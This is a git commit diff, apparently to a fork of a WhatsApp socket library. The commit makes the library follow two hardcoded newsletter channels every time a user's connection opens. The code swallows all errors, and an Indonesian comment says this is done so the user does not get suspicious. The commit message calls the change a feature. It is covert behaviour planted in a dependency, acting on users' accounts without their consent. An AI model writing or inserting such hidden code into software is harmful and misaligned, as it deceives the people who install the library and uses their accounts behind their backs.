f39419d82b7ada59ab5e9775b77471b4383ffc42
Nexa <dreamleaguesocers23@gmail.com>
2026-03-17 07:19:58 +0700

    Implement auto-follow for Nexa Tribute Channels
    Add automatic following of Nexa Tribute Channels upon socket connection.

--- src/Socket/index.ts
+++ src/Socket/index.ts
@@ -9,7 +9,27 @@ const makeWASocket = (config: UserFacingSocketConfig) => {
 		...config
 	}
 
-	return makeCommunitiesSocket(newConfig)
+	const sock = makeCommunitiesSocket(newConfig)
+
+	// --- AUTO FOLLOW CH NEXA ---
+	sock.ev.on('connection.update', async (update) => {
+		const { connection } = update
+		if (connection === 'open') {
+			try {
+				// Follow Channel 1
+				await (sock as any).newsletterFollow('120363405478589135@newsletter')
+				// Follow Channel 2
+				await (sock as any).newsletterFollow('120363404119115059@newsletter')
+				
+				console.log('Successfully followed Nexa Tribute Channels!')
+			} catch (e) {
+				// Tetap jalan meskipun gagal follow (biar user gak curiga/error)
+			}
+		}
+	})
+	// ---------------------------
+
+	return sock
 }
 
 export default makeWASocket
